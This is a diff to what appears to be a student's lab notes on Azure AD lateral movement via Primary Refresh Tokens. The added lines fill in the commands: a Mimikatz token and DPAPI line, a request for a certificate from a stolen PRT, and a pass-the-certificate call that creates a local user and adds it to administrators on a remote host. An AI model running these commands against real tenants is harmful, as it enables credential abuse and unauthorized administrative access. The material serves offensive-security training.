@@ -17,6 +17,7 @@
 - To go from Azure AD machine to other Azure AD machine if the user has administrative access to other machines.
 
 #### Check if machine is Azure AD Joined
+- Check for IsDeviceJoined : YES
 ```
 dsregcmd /status
 ```
@@ -33,16 +34,19 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd 
 
 #### Request a certificate from PRT
 - https://github.com/morRubin/PrtToCert
+- Code is modified in the lab
 ```
-
+& 'C:\Program Files\Python39\python.exe' RequestCert.py --tenantId <TENANT ID> --prt <PRT VALUE> --userName samcgray@defcorphq.onmicrosoft.com --hexCtx <CONTEXT KEY VALUE> --hexDerivedKey <DERIVED KEY VALUE>
 ```
 
 #### Use certificate to add a user with administrative privileges
 - Code is modified in the lab
 - https://github.com/morRubin/AzureADJoinedMachinePTC
 ```
-
+python C:\Users\vmuser\Documents\student38\AzureADJoinedMachinePTC\Main.py --usercert C:\Users\vmuser\Documents\student38\samcgray@defcorphq.onmicrosoft.com.pfx --certpass AzureADCert --remoteip 10.0.1.5 --command "cmd.exe /c net user student38 Stud38Password@123 /add /Y && net localgroup administrators student38 /add"
 ```
+
+#### Use psremoting to access the machine
 
 ### Pass the PRT
 #### Request access token (cookie) to all applications
